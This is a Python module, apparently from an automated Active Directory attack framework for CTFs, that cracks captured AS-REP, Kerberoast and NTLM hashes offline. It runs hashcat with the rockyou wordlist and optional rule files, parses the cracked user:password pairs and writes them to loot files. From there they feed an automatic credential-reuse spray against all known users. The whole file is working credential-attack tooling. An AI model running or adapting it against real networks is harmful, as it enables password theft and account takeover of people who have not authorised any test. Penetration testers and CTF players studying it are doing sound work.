"""
Offline hash cracking with hashcat + rockyou.

Fires after hashes are captured (AS-REP / Kerberoast / NTLM) and before the
credential-reuse spray, so any cracked plaintext lands in loot/creds_found.txt
and is sprayed across all known users automatically.

CTF policy: a single straight rockyou dictionary pass per hash type — no rules,
no masks, no brute-force. A wall-clock cap (--runtime) is a backstop so a slow
hash type can never stall the engagement; a plain dictionary run terminates on
its own once rockyou is exhausted.
"""
import re
from pathlib import Path

from lib import ui
from lib.runner import Runner
from lib.wordlists import Breadth, crack_rule_file
from lib.workspace import Workspace

# loot filename → (hashcat mode, human label, needs --username)
# AS-REP / Kerberoast hashcat formats embed their own username; NTLM hashes are
# stored as "user:nthash" so mode 1000 needs --username to strip the prefix.
_HASH_JOBS = [
    ("asrep.hash",      "18200", "AS-REP",     False),
    ("kerberoast.hash", "13100", "Kerberoast", False),
    ("ntlm.hash",       "1000",  "NTLM",       True),
]

_ROCKYOU_CANDIDATES = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt",
]

# Backstop wall-clock per hash type. Straight rockyou on RC4/NTLM finishes in
# seconds; this only ever bites slow (AES) hashes on a CPU-only host.
_RUNTIME_CAP = 1200


def _find_rockyou() -> str | None:
    for p in _ROCKYOU_CANDIDATES:
        if Path(p).is_file():
            return p
    return None


def _extract_username(line: str) -> str:
    """Best-effort username from a cracked hashcat --show line (display only)."""
    m = re.search(r"\$krb5asrep\$\d+\$([^@:]+)@", line)
    if m:
        return m.group(1)
    m = re.search(r"\$krb5tgs\$\d+\$\*([^$*]+)\$", line)
    if m:
        return m.group(1)
    # NTLM "user:nthash:plaintext" — first field is the username
    if ":" in line and "$" not in line.split(":", 1)[0]:
        return line.split(":", 1)[0]
    return ""


def _parse_show(output: str) -> list[tuple[str, str]]:
    """Parse `hashcat --show` output into (username, plaintext) pairs."""
    results: list[tuple[str, str]] = []
    for line in output.splitlines():
        line = line.rstrip("\n")
        if not line or line.startswith("[") or ":" not in line:
            continue
        password = line.rsplit(":", 1)[1].strip()
        if not password:
            continue
        results.append((_extract_username(line), password))
    return results


def crack_hashes(ws: Workspace, runner: Runner, findings, available: set[str],
                 breadth: Breadth = Breadth.CONCISE) -> list[tuple[str, str]]:
    """
    Crack any captured AS-REP / Kerberoast / NTLM hashes with rockyou and feed
    plaintext passwords into loot/creds_found.txt for the cred-reuse spray.

    `breadth` scales effort: CONCISE = straight rockyou (fast, the default);
    STANDARD/BROAD layer a hashcat rule file (best64 → big rule) for far more
    candidates at the cost of time. Resolution is graceful — a missing rule file
    steps down rather than failing.

    Returns the list of newly cracked (username, password) pairs. Safe to call
    when no hashes exist or hashcat is missing — it just returns [].
    """
    if "hashcat" not in available:
        return []

    rule_file = crack_rule_file(breadth)

    jobs = [(fn, mode, label, uname) for fn, mode, label, uname in _HASH_JOBS
            if (ws.loot_dir / fn).exists() and (ws.loot_dir / fn).stat().st_size > 0]
    if not jobs:
        return []

    rockyou = _find_rockyou()
    if not rockyou:
        findings.h2("Offline Cracking (hashcat + rockyou)")
        findings.note("rockyou.txt not found in standard paths — skipping auto-crack")
        return []

    rule_note = f" + {Path(rule_file).name}" if rule_file else ""
    findings.h2(f"Offline Cracking (hashcat + rockyou{rule_note})")
    potfile = ws.loot_dir / "hashcat.potfile"
    cracked_path = ws.loot_dir / "cracked.txt"
    cracked_seen = {l.strip() for l in cracked_path.read_text().splitlines()} if cracked_path.exists() else set()
    newly_cracked: list[tuple[str, str]] = []

    for fn, mode, label, needs_username in jobs:
        hash_path = ws.loot_dir / fn
        slug = label.lower().replace("-", "")

        accounts = [Workspace._krb_principal(l) for l in hash_path.read_text().splitlines() if l.strip()]
        who = ", ".join(accounts[:6]) + (" …" if len(accounts) > 6 else "")
        ui.info(f"cracking {label} (m {mode}, {len(accounts)} hash(es): {who}) with rockyou…")

        attack = [
            "hashcat", "-m", mode, "-a", "0",
            str(hash_path), rockyou,
            "--potfile-path", str(potfile),
            "-O", "--force", "--quiet",
            "--runtime", str(_RUNTIME_CAP),
        ]
        if rule_file:
            attack += ["-r", rule_file]
        if needs_username:
            attack.append("--username")
        findings.cmd(" ".join(attack))
        runner.run(attack, f"crack_{slug}_attack", timeout=_RUNTIME_CAP + 120)

        show = [
            "hashcat", "-m", mode, str(hash_path), "--show",
            "--potfile-path", str(potfile), "--quiet",
        ]
        if needs_username:
            show.append("--username")
        out = runner.run(show, f"crack_{slug}_show", timeout=120)

        results = _parse_show(out)
        if not results:
            findings.bullet(f"{label}: not cracked with rockyou")
            ui.lose(f"{label}: not cracked with rockyou")
            continue

        for user, password in results:
            cred_line = f"{user}:{password}" if user else password
            ui.good(f"cracked {label}: {cred_line}")
            findings.bullet(f"**CRACKED ({label}): `{cred_line}`**")
            findings.add_summary(f"**Cracked {label} password:** `{cred_line}`")
            # Feed the spray: add_cred dedups into loot/creds_found.txt
            before = ws.loot_dir / "creds_found.txt"
            had = {l.strip() for l in before.read_text().splitlines()} if before.exists() else set()
            ws.add_cred(password)
            if password not in had:
                newly_cracked.append((user, password))
            if cred_line not in cracked_seen:
                cracked_seen.add(cred_line)
                with cracked_path.open("a") as fh:
                    fh.write(cred_line + "\n")

    if newly_cracked:
        findings.bullet(
            f"**{len(newly_cracked)} password(s) cracked → `loot/creds_found.txt`** — "
            "will be sprayed against all known users in the cred-reuse phase"
        )

    return newly_cracked
